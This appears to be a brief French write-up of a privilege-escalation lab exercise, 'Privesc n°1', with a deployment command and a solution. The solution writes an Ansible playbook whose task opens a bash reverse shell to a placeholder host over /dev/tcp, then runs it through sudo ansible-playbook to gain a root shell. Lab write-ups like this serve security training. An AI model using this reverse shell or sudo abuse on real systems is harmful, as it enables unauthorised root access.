# Privesc n°1

## Déploiement

```bash
sudo bash build.sh
```

## Writeup

Fichier play.yaml  : 

```yaml
- hosts: localhost
  tasks:
  - name: revshell
    shell: bash -c 'bash -i >& /dev/tcp/X.X.X.X/XXXX 0>&1'
```

Puis on le déploie

```bash
LANG=C.UTF-8 sudo ansible-playbook play.yaml
```